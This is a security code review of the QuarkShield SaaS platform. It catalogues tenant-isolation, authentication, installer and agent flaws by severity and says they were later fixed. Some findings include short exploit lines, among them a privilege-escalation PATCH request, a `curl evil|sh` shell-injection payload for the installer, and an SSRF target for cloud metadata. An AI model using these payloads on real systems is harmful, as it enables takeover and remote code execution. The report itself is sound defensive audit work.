# QuarkShield code review — 2026-10-07

> **LIVE VERIFICATION (2026-10-08).** Beyond static checks, the hardened build was run for real:
> Postgres 15 in Docker + the compiled server, the production UI bundle, and a release-style
> agent binary. A 60-step end-to-end script passed (admin/tenant/operator logins, forced password
> change, session revocation on change/lock/logout, role sanitising, cross-tenant 403s, token
> minting pinned to the caller's tenant, agent ingest/re-ingest/oversize 413, command polling,
> 2FA enrol/challenge, fix-script sanitising, installer-token sanitising, rate limiting, anonymous
> CI gate). The real agent scanned, enrolled over loopback, refused plaintext to a non-loopback
> host, and its local API was correctly gated. Browser: landing page loads with no redirect, sign-in
> opens the console with the server-confirmed role, logout works, and an anonymous visit to the
> console URL now lands on the landing page. Boot checks: production refuses placeholder JWT /
> missing DB password; schema converges on the second boot (0 skipped statements).
> Live testing found and fixed: sample fleet/CBOM/license data still rendered on API failure in the
> console, a hardcoded customer id, and the lazy (first-request) secret check, now enforced at boot.

> **FINAL STATUS — branch `security-hardening`.**
> Two passes were done after the upstream hotfix landed: (1) fixes for every open finding below,
> (2) a fresh three-agent re-review of the diff, with every flag re-verified by hand and the
> confirmed ones fixed. Verification: server `tsc` clean, UI `tsc` clean, agent `go build`/`go vet`/
> `go test` clean on darwin/linux/windows, `docker compose config` valid, 26/26 regression canaries
> in `server/test/security-regression.test.mjs` (run with `cd server && npm run test:security`).
>
> **All Critical and High findings below are now closed**, plus the mediums and lows except where
> noted as "accepted" in the per-item status. Items the re-review surfaced and that were ALSO fixed:
> agent-supplied text pasted into the downloadable bash "fix script" (RCE on tenant admins);
> fabricated SBOM/CVE template seeded into real tenants; fleet tokens readable/mintable by any tenant
> role; fake license keys "simulated" client-side on API failure; a `/api/auth/me` probe that bounced
> every fresh visitor to `?session=expired`; logout that never revoked the cookie; the landing-page
> forced-password-change flow pointing at a route that never existed; my own symlink guard skipping
> Let's Encrypt and Debian CA symlinks; the systemd daemon having no HOME; a shared rate limiter that
> would throttle fleets behind one NAT; the docker entrypoint being untracked.
>
> **Operational notes before deploy (read these):**
> - The committed demo license keys (including the live `QS-CORP-SPINOVATIONCORP-…` key) are revoked
>   on first boot because they were public. Any agent enrolled with one of them will get 401 on its
>   next sync: generate a new license/fleet token from the Super Admin console and re-enroll.
> - `DB_PASSWORD` is now required; an existing deployment that relied on the old `postgres` default
>   must set `DB_PASSWORD=postgres` (the value its volume was initialised with) or rotate it.
> - Release agent binaries must be built with `LICENSE_SIGNING_SECRET` (and `FEDMITIGATE_P12_PASSWORD`
>   for local signing) in the environment; the build scripts refuse otherwise. Dev builds refuse
>   offline license activation by design.
> - Logging out now ends the account's sessions on every device (server-side revocation).
> - Sessions are checked against the DB on each request (30 s cache); a DB outage degrades all
>   browsers to signed-out rather than crashing.
> - Still a business decision, not a code fix: distributing the self-made "FedMitigate" root CA to
>   customers (H-12). Recommend dropping the Trust-* scripts in favour of a public code-signing CA.
> - Third wave (2026-10-08) also closed: DNS-rebinding window on the TLS probe and proxy test
>   (connect to the pre-verified IP with SNI), report emailing restricted to tenant admins, POA&M
>   spreadsheet formula injection, spoofable client-IP headers in download analytics, login
>   enumeration of password-less accounts, the synthetic "Spinovation" client fallback and
>   email-based root status, owner-specific boot-time SQL, case-insensitive tenant user uniqueness,
>   git honouring HTTPS_PROXY/NO_PROXY/GIT_SSL_CAINFO, process exit on uncaught exceptions, and the
>   agent verifying licenses against its enrolled server (self-hosted deployments).
> - Residual lows accepted: the 32-bit truncated license HMAC (key-format compatibility), git clone
>   refusing redirected/renamed repositories (deliberate: redirects are the SSRF vector), `/health`
>   doing one DB query per hit, Vault/Azure/AWS SDK connectors still resolving DNS themselves
>   (the hostname is pre-checked; pinning would require patching the SDKs' transports).

Scope: whole repository (Express/TypeScript server, React UI, Go agent, infra/scripts/schema).
Method: five parallel review agents by area, then every flag re-verified by hand against the
source and route guards. Flags that did not hold up were dropped or downgraded (noted at the end).

Build health: server `tsc` clean, UI `tsc` clean, agent `go build` + `go vet` clean on
darwin/linux/windows. One stale agent test fails (see L-1).

Severity key: **Critical** = any tenant user or anonymous attacker gains cross-tenant or platform-level
access with trivial effort. **High** = serious exposure needing one precondition. **Medium** = real bug,
limited blast radius. **Low** = hygiene / latent.

---

## Critical

### C-1. Any tenant user can promote themselves to platform superadmin
`server/src/controllers/adminController.ts:1949-1960` (`updateTenantUser`), `:1869-1888` (`createTenantUser`);
routes `routes.ts:239-240` are guarded only by `requireAuth, requireTenantAccess`.

- No check of the caller's role within the tenant (an `auditor` can call these).
- `role` from the body is written to `tenant_users.role` with no allow-list.
- Login (`adminController.ts:2734`) signs `role: tu.role` straight into the JWT; `isSuperRole('superadmin')`
  then passes `requireSuperAdmin`, `requireTenantAccess`, `canAccessTenant`, `resolveWriteTenant` everywhere.

Exploit: `PATCH /api/tenants/<mine>/users/<my id> {"role":"superadmin"}`, log out, log in. Full platform takeover.

### C-2. Any tenant user can reset any platform operator's password and read it from the response
`adminController.ts:2015-2026, 2078` (`resetTenantUserPassword`), `:1884-1888, 1940` (`createTenantUser`).

- `createTenantUser` upserts `ON CONFLICT (tenant_name, email) DO UPDATE ... password_hash = $7`, so
  "inviting" an existing same-tenant user (including the tenant admin) rotates their password, and the
  temp password is returned in JSON (`password: tempPassword`).
- `resetTenantUserPassword` additionally writes the new hash into **`admin_users` by email**. Create a
  tenant user with a superadmin's email, reset it, log in as the superadmin. Blocked only if that admin has TOTP.
- `resetTenantUser2FA` (`:1986`) and `deleteTenantUser` (`:1973`) are equally unguarded, so the attacker
  first strips 2FA from the target.

### C-3. Cross-tenant executive report / stakeholder overwrite via body `tenant`
`server/src/controllers/reportController.ts:298-302, 343-344`; route `routes.ts:143-146`.
`requireTenantAccess` only inspects params/query/headers, never `req.body`. `resolveScope` uses body
`tenant` as-is. Tenant A posts `{"tenant":"ACMECORP","recipients":[{"email":"me@evil"}]}` to
`/reports/executive/send` and receives ACMECORP's roadmap by email; `saveReportStakeholders` lets A
redirect B's future reports.

### C-4. AI Copilot prompt contains every tenant's assets, and uses whichever tenant's API key sorts last
`server/src/controllers/aiController.ts:80` is `SELECT ... FROM assets` with no tenant filter, serialized
into the LLM prompt for every chat. `:105` reads `gemini_api_key`/`anthropic_api_key` from `tenant_settings`
with no tenant filter. Same unscoped key lookup in `lib/roadmapReport.ts:252`.

### C-5. Reflected shell injection into the public `curl | sudo bash` installer
`server/src/controllers/fleetController.ts:440, 449` (sh) and `:554, 558` (PowerShell).
`?token=` is embedded verbatim: `TOKEN="${queryToken}"`. A link to the real domain,
`/api/scan/agent/install.sh?token=%22;curl%20evil|sh;%22`, executes attacker commands as root on any
host that runs the documented install one-liner. The installer also downloads the binary without any
checksum, and derives `SERVER_URL` from the `Host` header (`:437`).

### C-6. `deploy.sh` ships the example secrets to production
`deploy.sh:26-29` copies `.env.example` to `.env` when none exists. The placeholders are long enough to pass
`auth.ts:23` (`length >= 16`) and `bootstrap.ts:16` (`length >= 12`), so a fresh VPS runs with a public
JWT secret (forge any superadmin cookie), a public license-HMAC secret, and a known bootstrap superadmin password.

---

## High

### H-1. Public Stripe checkout can overwrite an existing tenant and mint it a fleet token
`server/src/controllers/billingController.ts:83, 111, 515-523, 553-569, 172-176`; routes `routes.ts:352-354` public.
Slug is derived from `companyName`; `admin_clients` upsert is `ON CONFLICT (name) DO UPDATE SET status, subscription_tier,
mca_limit`. A 14-day trial means no charge. Attacker gets a valid `fleet_tokens` row for the victim slug and reads
the license key from the public `registration-status/:sessionId`.

### H-2. `createFleetToken` trusts body `tenantName`
`fleetController.ts:67, 75, 91-97, 108-116`. Unlike `createProxy`/`createPkiConnector` (which use
`resolveWriteTenant`), this takes the tenant from the body. Any tenant mints an enrollment token for any other
tenant and gets that tenant's real `admin_licenses.license_key` back in the response.

### H-3. `LIKE '%tenant%'` tenant filters leak tokens, machines, assets, drift
`fleetController.ts:50-51, 181-183, 250-251, 1195`; `lib/roadmapReport.ts:121-123`.
`getFleetTokens` returns plaintext tokens for every tenant whose slug or token *name* contains the caller's
slug (`ACME` sees `ACME-EU`; `CORP` sees a lot). `_` in a slug is a wildcard.

### H-4. Hardcoded, seeded, active license key doubles as an enrollment credential
`fleetController.ts:176, 103, 236` fall back to `QS-CORP-SPINOVATIONCORP-6C894B76-DA9EF3D8`;
`schema.sql:294` seeds it as an active 100-seat license on every boot; `ingestTelemetry` (`:640-664`) accepts
any `admin_licenses` key as a token. Anyone with the repo can enroll machines into SPINOVATIONCORP.

### H-5. PKI connector SSRF guard skips endpoints supplied via `config`
`pkiConnectorController.ts:17-19` returns early on empty `endpoint_url`; `:80, 93` then use
`cfg.address` / `cfg.vaultUrl` / `cfg.endpointUrl` unchecked. `hashiVault.ts:31,83,88` fetch attacker URLs
(e.g. `http://169.254.169.254`) with attacker-controlled path segments; status codes are echoed back.

### H-6. In-memory git-scan cache returns other tenants' scans
`gitScanController.ts:723, 878-904`. The fallback to the process-global `recentScansCache` triggers on an
*empty* DB result, not just an error. A tenant with no scans sees the last 50 scans from all tenants.

### H-7. `/auth/change-password` is unauthenticated, 2FA-free, cross-table, and broken after first login
`adminController.ts:2910-2967`; route `routes.ts:141` has no `requireAuth`.
- Knowing a user's temp password lets anyone rotate it with no session and no TOTP; the same hash is written
  to **both** `admin_users` and `tenant_users` by email.
- Logic bug: login upgrades hashes to bcrypt and sets `salt = NULL` (`:2701`); this handler only verifies
  sha256+salt, so every post-first-login change fails with 401, and any success downgrades bcrypt to sha256.

### H-8. All five operator roles are full superadmins
`middleware/auth.ts:60`: `SUPER_ROLES` includes `support_engineer` and `compliance_auditor` ("Read-Only").
`inviteOperator` defaults to `support_engineer` (`adminController.ts:661`). A new support hire can
`DELETE /admin/clients/:id` and promote users.

### H-9. Fabricated demo rows are seeded into real customer tenants on every boot
`schema.sql:481-524` inserts fake BLOCKED PRs, PKI connectors and proxies for `SPINOVATIONCORP` and `AMBEROON`
with `ON CONFLICT (id) DO NOTHING`, including a named real person's email. Deleting them resurrects them at
next restart. Several tables also `DEFAULT 'SPINOVATIONCORP'` for `tenant_name` (`schema.sql:54,381,423,463`).

### H-10. Go agent: local dashboard leaks the gate token and secrets over unauthenticated GET
`agent/gui.go:177-186` only checks `qs_local_token` on POST/PUT/PATCH/DELETE.
- `GET /api/enrollment` (`:827`) returns the config including `localApiToken` (`client.go:30`), defeating the gate.
- `GET /api/status` (`:291-315`) returns the fleet `token` and license key.
- `/api/uninstall`, `/api/exit`, `/api/scan/cancel` have no method check (`:849, 862, 449`), so
  `curl 127.0.0.1:48291/api/uninstall` from any local account uninstalls the agent.

### H-11. Go agent: offline license verification is forgeable
`agent/license.go:24, 177-179, 188-205`. Hardcoded default HMAC secret, build scripts never override it
(`-ldflags="-s -w"` only, `build_all_and_sign.sh:21,104,222`), signature truncated to 8 hex chars (32 bits),
and the generator is compiled into the shipped binary. Revocation is honoured only if the server error text
contains "revoked" (`:331`); any network failure re-activates offline with 100 seats.

### H-12. Customers are told to trust a home-made root CA whose key password is in the repo
`agent/Trust-FedMitigate.ps1:31,45` installs "FedMitigate Root CA" into `CurrentUser\Root` and, if admin,
`LocalMachine\Root` (valid to 2046). `build_all_and_sign.sh:37-38` uses `-pass fedmitigate` for the `.p12`.
If that `.p12` ever leaves a dev laptop, every customer machine trusts attacker TLS certs and code signatures.
`Trust-FedMitigate.command:29-33` also strips quarantine and bypasses Gatekeeper.

### H-13. UI authorization is purely client-side
`ui/src/App.tsx:327-336`: superadmin is inferred from `localStorage.quarkshield_user` containing `@quarkshield.ai`
or equalling a personal Gmail address. `TenantPortal.tsx:1309-1325`: any login response that is not 400/401/403
(e.g. 500, 502, 429) falls through to `completeTenantLogin()` and the UI believes it is logged in as
"Corporate Admin". The UI never calls `/api/auth/me`. JWT is also mirrored into localStorage and replayed as
Bearer (`LandingPage.tsx:519-520`, `AdminPanel.tsx:1727`), so an XSS harvests a 7-day credential despite the
httpOnly cookie. Server enforcement still holds per-call, which is what keeps this High and not Critical.

### H-14. `postgres/postgres` defaults at both layers; health check hardcodes user/db
`docker-compose.yml:7-8,14,38-39`, `server/src/config/db.ts:9-13`. An unset `DB_PASSWORD` silently yields the
default password. Setting a non-`postgres` `DB_USER` makes `pg_isready -U postgres` fail and the console never starts.

---

## Medium

- **M-1** Sessions are never revoked: lock, delete, password reset, 2FA reset leave 7-day JWTs valid
  (`auth.ts:96-121`, stateless verify; login also returns the token in JSON at `adminController.ts:2656`).
- **M-2** `POST /2fa/setup` replaces an enabled secret with no current code (`twoFactorController.ts:32-35`),
  so a stolen session becomes a persistent 2FA-owning foothold. `/2fa/disable` correctly requires a code.
- **M-3** All four 2FA handlers are `async` with no try/catch and there is no `unhandledRejection` handler;
  on Express 4 + Node 22 a transient DB error during `/2fa/status` terminates the process.
- **M-4** Tenant slug normalization mismatch: `createClient` keeps hyphens (`adminController.ts:284`), everything
  else strips them; `getTenantPortalData` matches `REPLACE(name,'-','') = $1 ... LIMIT 1` unordered (`:2993-3000`)
  and returns plaintext fleet tokens (`:3110-3119`). `tenant_users UNIQUE(tenant_name,email)` is case-sensitive
  while lookups use `LOWER()`, so duplicate user rows are possible.
- **M-5** Unauthenticated `POST /git/ci-gate/evaluate` (`ciGateController.ts:85-96, 199-211`): 20 MB body, regex
  over every line, one DB row per call, no rate limit. Ingest and ADCS report have no asset-count cap either.
- **M-6** Deterministic machine id `sha256(tenant + '-' + hwUUID|hostname)` (`fleetController.ts:761-762`) collides
  across tenants whose names contain `-`; the `ON CONFLICT (id)` update has no tenant guard and `:960` deletes
  the victim's assets.
- **M-7** Non-transactional delete-then-insert on ingest (`fleetController.ts:960-995`) and connector sync; seat-limit
  check is count-then-insert with no lock (`:735-755`). `scanRemoteGitRepo` is the only one that uses a transaction.
- **M-8** Git clone SSRF guard is TOCTOU and git follows redirects (`gitScanController.ts:583-617`); the full
  process env (JWT secret, DB creds) is inherited by `git`; PAT appears in argv.
- **M-9** `getCIGatePolicies` defaults `tenant = 'SPINOVATIONCORP'` and returns all `is_default` rows cross-tenant
  (`ciGateController.ts:257-260`); `createProxy`/`createPkiConnector` default super sessions into SPINOVATIONCORP.
- **M-10** Authenticated HTML/header injection in invite emails: `firstName`/`role` interpolated unescaped
  (`adminController.ts:1905-1906`); sendmail fallback builds raw headers from `to` (`:100`) and the email check is
  just `includes('@')` (`:1873`).
- **M-11** Hardcoded customer credentials and PII: `tempPassword = 'QS-Amberoon7033!'` (`adminController.ts:1438`),
  partner email/customer id/license key fallbacks (`:1456-1474`), founder Gmail as root in the UI bundle
  (`App.tsx:329`), 14 customer workspace slugs in `TenantUserManagement.tsx:74-88`.
- **M-12** Two `getLicenseSecret()` implementations: admin fails closed in prod (`adminController.ts:929-934`),
  billing falls back to `'dev-insecure-license-secret-change-me'` (`billingController.ts:52-56`).
- **M-13** TOTP secrets, connector credentials and CBOM attestations all fall back to `JWT_SECRET` as the key
  (`utils/twofactor.ts:12`, `utils/secretbox.ts:12`, `lib/cyclonedx.ts:138`); rotating the JWT secret bricks
  all 2FA and all stored connector credentials.
- **M-14** Server starts and `/health` says `ok` even when the DB is unreachable or the schema failed
  (`index.ts:193-200`, `db.ts:84-88`); the schema is re-applied on every boot with every error swallowed
  (`db.ts:111-119`), no versioning, no transaction.
- **M-15** Hot tenant-scoped columns have no indexes (`assets.machine_id`, `assets.tenant_name`,
  `fleet_machines.tenant_name`, `fleet_tokens.tenant_name`, `fleet_commands.machine_id`), and most lookups wrap
  them in `LOWER()`; every agent sync is a sequential scan of `assets`. Three full-table `UPDATE`s run on every boot
  (`schema.sql:337-373`).
- **M-16** Runtime image runs as root, bakes one self-signed TLS private key into the layer, uses `npm install`
  not `npm ci` (`Dockerfile:28-29,42-44`); compose publishes the same process on 7 ports and bind-mounts the whole
  `.env` into the container.
- **M-17** `cf-origin-firewall.sh:105-106,136-152` fails open: `apply` exits 1 if the Cloudflare IP fetch fails,
  and the systemd unit orders only after `docker.service`, so a reboot can leave the origin directly reachable.
- **M-18** `install-linux.sh:78` writes the enrollment token into `ExecStart` of a world-readable systemd unit
  (also visible in `ps`). `sign_azure.py:33-34,96-108` loads the production `.env` into the signing process and
  passes the Azure bearer token on the `jsign` command line.
- **M-19** Backups (`scripts/pg-backup.sh`) are unencrypted, host-local only, 14-day retention, no restore test.
- **M-20** UI: tenant portal shows "Your session has expired" after a successful in-portal login on a fresh
  browser. Mount effect (`TenantPortal.tsx:1263`) fetches portal-data before login, the 401 latches
  `sessionExpired=true` (`:1096`), nothing ever sets it false, and `completeTenantLogin` (`:1269`) does not refetch.
  The guard at `:2596` then wins once `isAuthenticated` is true. The apex-login-then-redirect path is unaffected.
- **M-21** UI: `public/signup-result.html:166,176-190` builds `innerHTML` from server JSON (`subdomain`,
  `licenseKey`) and puts `sessionId` into the API path unencoded. Copilot transcripts persist per-slug in
  localStorage across users on a shared device (`TenantPortal.tsx:434-442`).
- **M-22** Go agent: symlinked files bypass the 2 MB guard (`main.go:256-262`, `d.Info()` is lstat but
  `os.ReadFile` follows); a FIFO named `x.key` hangs the scan. Scan history and license dir are 0755/0644
  (`scan_store.go:75,84,177`, `license.go:65,74`) while enrollment is 0600; whichever runs first decides
  `~/.quarkshield` permissions. Plaintext-HTTP guard is a substring check (`client.go:139-142`:
  `http://localhost.attacker.com` passes). Cancel-then-start race lets a stale scan overwrite a new one
  (`gui.go:449-456`). Single-instance handshake posts the local token to whoever holds port 48291 (`gui.go:195-209`).
  `serverURL` is interpolated raw into the launchd plist and `schtasks` string (`gui_other.go:52`,
  `gui_windows.go:49`); `pickFolderOS` runs bare `powershell.exe -ExecutionPolicy Bypass` (`gui_windows.go:154`)
  despite the project's own absolute-path helpers.

---

## Low

- **L-1** `agent/adcs_test.go:46` expects `("",0) -> "unknown"/false`; implementation deliberately fails closed
  (`adcs.go:66-67`: `"Unknown"/true`). Test is stale; update the expectation.
- **L-2** Account-state enumeration at login (`adminController.ts:2637-2642, 2686-2695`): distinct messages for
  locked / no password / inactive workspace.
- **L-3** Tenant portal returns plaintext fleet tokens to every tenant role including `auditor`
  (`adminController.ts:3110-3119`).
- **L-4** `sbomController.ts:823-828` accepts `x-admin-role: super_admin` or `?admin=true` as superadmin proof.
  Currently reachable only for the platform's own SBOM, but the UI sends these headers (`SbomInventory.tsx:104-105`).
  Delete the branch.
- **L-5** `/scan/agent/commands` matches machines by hostname alone when the hardware UUID misses
  (`fleetController.ts:1538-1548`), letting a token holder drain another machine's pending commands.
- **L-6** Secrets with non-standard config keys (`password`, `apiKey`) are stored plaintext in `config_summary`
  (`pkiConnectorController.ts:161-169`).
- **L-7** `randToken` falls back to a constant on RNG failure (`agent/systools.go:36-42`); launchd logs are fixed
  paths in `/tmp` (`gui_other.go:58-59`); response bodies decoded without `io.LimitReader` (`client.go:296`,
  `license.go:291`).
- **L-8** UI: hardcoded fake enrollment tokens injected into copy-paste deploy commands when the token API fails
  (`App.tsx:596-618`); server-controlled `window.location.href = data.redirectUrl` with no allow-list
  (`LandingPage.tsx:554`); tenant-switch fetches have no stale-response guard (`SbomInventory.tsx:153`).
- **L-9** `ui/src/components/LandingPage.backup.tsx` (7.5k lines) is dead but typechecked every build. Delete.
- **L-10** `agent/binaries/*` is git-ignored but `Dockerfile:51` copies it, so a clean clone builds an image with
  no agent downloads. `notarize_build.command:12-13` and `Trust-*.command:4` hardcode a personal Apple ID and name.
- **L-11** CORS reflects any origin with credentials when `ALLOWED_ORIGINS` is empty (`index.ts:25-36`; compose
  defaults it to empty). Mitigated today by `SameSite=Lax`, but one cookie-attribute change away from CSRF.
- **L-12** `/central/entitlement` compares the service token with `!==` (`routes.ts:289`); `localTenantEntitlement`
  fails open to "entitled" on DB error (`auth.ts:263-266`, documented as intentional).

---

## Flags reviewed and NOT accepted / downgraded

- "`Bearer null` header makes a valid cookie session be rejected": the server explicitly ignores the literal
  strings `null`/`undefined` (`auth.ts:88`). Dropped.
- Prober `InsecureSkipVerify` retry (`agent/prober.go:50`): deliberate for a reconnaissance tool that only reports
  handshake parameters. Informational.
- "`/api/probe` is SSRF": `assertPublicHost` resolves and CIDR-checks; remaining gap is DNS-rebinding TOCTOU only.
- SQL injection: none found anywhere in `server/src`; all dynamic clauses are parameterised.
- Committed secrets / private keys: none found (`.env` absent, only public `.cer/.crt` committed).

---

## Suggested fix order

1. **Tenant user management** (C-1, C-2): require tenant `admin` role on every `/tenants/:tenant/users*` and
   `2fa-policy` route, allow-list `role` to `admin|secops|auditor`, forbid editing your own row, drop the
   `admin_users` write and the upsert, stop returning passwords. Shrink `SUPER_ROLES` to two values (H-8).
2. **Body-tenant trust** (C-3, H-2): use `resolveWriteTenant` / `canAccessTenant` in `reportController` and
   `createFleetToken`. Scope `aiController` queries by tenant (C-4). Replace every `LIKE '%tenant%'` with
   equality (H-3).
3. **Installer** (C-5): validate `token` against `^[A-Za-z0-9_-]+$`; publish a SHA-256 and verify it in the script.
4. **Secrets and seeds** (C-6, H-4, H-9, M-11, M-12): make `deploy.sh` refuse to run on example secrets; delete the
   seeded license key and demo rows from `schema.sql`; remove hardcoded customer credentials; unify
   `getLicenseSecret`.
5. **Checkout** (H-1): refuse a slug that already exists in `admin_clients` or use `DO NOTHING` + manual review.
6. **Auth hygiene** (H-7, M-1, M-2, M-3): require a session for change-password and use `verifyPassword`/bcrypt;
   add a `session_version` checked in `attachUser`; require a current code in `/2fa/setup`; add an async wrapper
   and a process-level `unhandledRejection` handler.
7. **Agent** (H-10, H-11): check the local token on every `/api/*` request regardless of method and strip
   `localApiToken`/`token` from GET responses; set `LicenseSigningSecret` via `-ldflags -X` in all build scripts,
   use the full HMAC, fail closed on any server error for revoked keys.
8. **UI** (H-13, M-20): bootstrap from `/api/auth/me`, drop `quarkshield_token` from storage, remove the
   email-based superadmin inference, treat any non-`success` login as failure, reset `sessionExpired` and refetch
   on login.
9. **Infra** (H-12, H-14, M-14..M-19): adopt a real migration tool, add indexes, add `USER node` and a runtime-mounted
   TLS key to the Dockerfile, fail health when the DB is down, make the firewall unit order after
   `network-online.target`, encrypt and ship backups off-host, and reconsider distributing a self-made root CA.
